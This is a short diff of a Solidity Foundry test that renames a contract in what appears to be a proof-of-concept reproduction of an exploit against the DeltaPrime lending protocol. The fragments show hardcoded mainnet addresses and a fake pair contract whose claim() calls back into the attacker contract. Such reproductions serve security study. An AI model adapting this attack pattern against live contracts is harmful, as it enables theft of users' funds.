@@ -57,7 +57,7 @@ interface ISimpleSwap {
     ) external;
 }
 
-contract DeltaPrimeExp is Test {
+contract DeltaPrime is Test {
     IWETH WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     ISmartLoansFactoryTUP SmartLoansFactoryTUP = ISmartLoansFactoryTUP(0xFf5e3dDaefF411a1dC6CcE00014e4Bca39265c20);
@@ -237,7 +237,7 @@ contract FakePairContract {
     }
 
     function claim(address user, uint256[] calldata ids) external {
-        attackContract.call(abi.encodeWithSelector(DeltaPrimeExp.convertETH.selector, ""));
+        attackContract.call(abi.encodeWithSelector(DeltaPrime.convertETH.selector, ""));
     }
 
     function getRewardToken() external returns (address) {
